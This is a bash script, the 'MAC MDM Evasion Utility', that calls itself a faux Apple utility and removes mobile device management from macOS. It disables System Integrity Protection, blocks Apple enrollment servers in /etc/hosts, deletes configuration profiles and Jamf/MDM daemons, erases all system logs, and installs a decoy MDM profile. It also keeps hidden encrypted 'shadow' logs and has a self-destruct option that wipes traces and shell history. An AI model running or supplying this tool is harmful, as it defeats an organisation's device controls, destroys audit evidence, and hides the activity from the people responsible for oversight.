#!/bin/bash
# =================================================
#  MAC MDM Evasion Utility
#  Version: 1.7
#  Author: Darknessownsu
#  macOS Big Sur → Sonoma
# =================================================
# Faux Apple-style utility for MDM evasion & reversion
# Includes: About Panel, Shadow Logs, Self-Destruct
# =================================================

APP_NAME="MAC MDM Evasion Utility"
VERSION="1.7"
AUTHOR="Darknessownsu"

SHADOW_DIR="/var/db/.shadow"
SHADOW_LOG="$SHADOW_DIR/mdm.log.enc"
mkdir -p "$SHADOW_DIR"
LOG_KEY=$(uuidgen | md5)

logmsg() {
    while IFS= read -r line; do
        echo "$line"
        echo "$line" | openssl enc -aes-256-cbc -a -salt -pass pass:$LOG_KEY >> "$SHADOW_LOG" 2>/dev/null
    done
}

banner() {
    clear
    echo "================================================="
    echo "        $APP_NAME"
    echo "        Version $VERSION"
    echo "        Author: $AUTHOR"
    echo "-------------------------------------------------"
    echo " Manage enrollment and configuration profiles"
    echo " on your Mac with a secure, menu-driven utility."
    echo "-------------------------------------------------"
    echo
}

status_bar() {
    local msg=$1
    echo "-------------------------------------------------"
    echo " Status: $msg"
    echo "-------------------------------------------------"
}

# ---------------------------
# Core Functions
# ---------------------------

evasion() {
    banner
    status_bar "Running Evasion Sequence"
    echo "[*] Disabling SIP + authenticated root..." | logmsg
    csrutil disable
    csrutil authenticated-root disable

    /usr/bin/mount -uw / || { echo "[!] Mount failed." | logmsg; return; }

    HOSTS="/etc/hosts"
    [ -f "$HOSTS" ] && cp "$HOSTS" "$HOSTS.backup.$(date +%s)" && echo "[*] Hosts backup saved." | logmsg
    for ep in mdmenrollment.apple.com deviceenrollment.apple.com gdmf.apple.com; do
        grep -q "$ep" "$HOSTS" || echo "127.0.0.1 $ep" >> "$HOSTS"
    done

    PROFILES=$(/usr/bin/profiles -P | grep "uuid" | awk -F: '{print $2}' | tr -d ' ')
    for ID in $PROFILES; do
        echo "[*] Removing $ID..." | logmsg
        /usr/bin/profiles -R -p "$ID"
    done

    for svc in /Library/LaunchDaemons/*.plist; do
        if grep -qiE 'jamf|mdm|dep' "$svc"; then
            launchctl bootout system "$svc"
            rm -f "$svc"
            echo "[*] Disabled rogue daemon: $svc" | logmsg
        fi
    done

    for dir in "/usr/local/jamf" "/Library/Application Support/Jamf"; do
        [ -d "$dir" ] && rm -rf "$dir" && echo "[*] Removed $dir" | logmsg
    done

    /usr/bin/log erase --all && echo "[*] Logs erased." | logmsg
    /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on
    /usr/sbin/nvram -c

    BYPASS="/tmp/bypass_mdm.mobileconfig"
    cat <<EOF > "$BYPASS"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.mdm</string>
            <key>ServerURL</key>
            <string>https://localhost/mdm</string>
            <key>PayloadIdentifier</key>
            <string>com.bypass.mdm</string>
            <key>PayloadUUID</key>
            <string>$(uuidgen)</string>
            <key>PayloadDisplayName</key>
            <string>Enrollment Profile</string>
        </dict>
    </array>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadIdentifier</key>
    <string>com.bypass.config</string>
    <key>PayloadUUID</key>
    <string>$(uuidgen)</string>
    <key>PayloadDisplayName</key>
    <string>Enrollment Config</string>
</dict>
</plist>
EOF
    /usr/bin/profiles -I -F "$BYPASS" && echo "[*] Bypass profile installed." | logmsg

    /usr/sbin/bless --mount / --bootefi --create-snapshot && echo "[*] Snapshot created." | logmsg

    status_bar "Evasion Complete – Restart Recommended"
    read -p "Press Enter to return to menu..."
}

reversion() {
    banner
    status_bar "Running Reversion Sequence"
    /usr/bin/profiles -R -p "com.bypass.mdm"
    /usr/bin/profiles -R -p "com.bypass.config"

    if ls /etc/hosts.backup.* 1> /dev/null 2>&1; then
        LATEST=$(ls -t /etc/hosts.backup.* | head -1)
        cp "$LATEST" /etc/hosts
        echo "[*] Hosts restored from backup." | logmsg
    fi

    csrutil enable
    csrutil authenticated-root enable

    /usr/sbin/bless --mount / --bootefi --create-snapshot && echo "[*] Fresh snapshot created." | logmsg

    status_bar "Reversion Complete – Restart Required"
    read -p "Press Enter to return to menu..."
}

stealthlogs() {
    banner
    status_bar "Shadow Log Info"
    echo "[*] Shadow log: $SHADOW_LOG"
    echo "[*] Decrypt with:"
    echo "    openssl enc -aes-256-cbc -d -a -in $SHADOW_LOG -pass pass:$LOG_KEY"
    read -p "Press Enter to return to menu..."
}

selfdestruct() {
    banner
    status_bar "Wiping Traces"
    rm -rf "$SHADOW_DIR"/*
    rm -rf /etc/hosts.backup.*
    history -c
    echo "[*] Self-destruct complete." | logmsg
    read -p "Press Enter to return to menu..."
}

about() {
    banner
    echo "-------------------------------------------------"
    echo " About This Utility"
    echo "-------------------------------------------------"
    echo " Name:     $APP_NAME"
    echo " Version:  $VERSION"
    echo " Author:   $AUTHOR"
    echo " Build:    Secure Shell Menu – Faux Apple Utility"
    echo "-------------------------------------------------"
    echo " This tool is presented as a standard macOS"
    echo " configuration manager. All actions are logged"
    echo " securely into shadow storage."
    echo "-------------------------------------------------"
    echo
    read -p "Press Enter to return to menu..."
}

# ---------------------------
# Menu Loop
# ---------------------------
while true; do
    banner
    echo "Choose an option:"
    echo "  1. Run Evasion"
    echo "  2. Run Reversion"
    echo "  3. Shadow Log Info"
    echo "  4. Self-Destruct / Wipe Traces"
    echo "  5. Exit"
    echo "  6. About This Utility"
    echo
    read -p "Choice: " opt
    case $opt in
        1) evasion ;;
        2) reversion ;;
        3) stealthlogs ;;
        4) selfdestruct ;;
        5) exit 0 ;;
        6) about ;;
        *) echo "[!] Invalid choice." ;;
    esac
done